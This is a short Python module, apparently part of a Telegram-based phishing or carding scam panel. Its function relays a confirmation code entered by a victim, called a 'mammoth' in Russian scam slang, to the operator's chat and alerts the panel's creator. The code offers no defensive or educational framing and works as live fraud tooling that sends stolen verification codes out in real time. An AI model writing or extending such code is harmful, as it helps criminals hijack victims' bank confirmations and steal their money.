from aiogram import Bot
from database.db import Database


db = Database()


async def send_confirm_code(
    endpoint: str,
    code: str,
):
    endpoint = endpoint.split("/")[2]
    info = await db.get_endpoint(endpoint)
    bot_id = info['bot_id']
    bot_info = await db.get_bot_info(bot_id)
    bot = Bot(bot_info['token'])
    await bot.send_message(
        chat_id=info['vbeaver'],
        text=f"🦣 Мамонт ввел код: {code}"
    )
    await bot.send_message(
        chat_id=info['creator'],
        text="🟢 Вбивер ввел код"
    )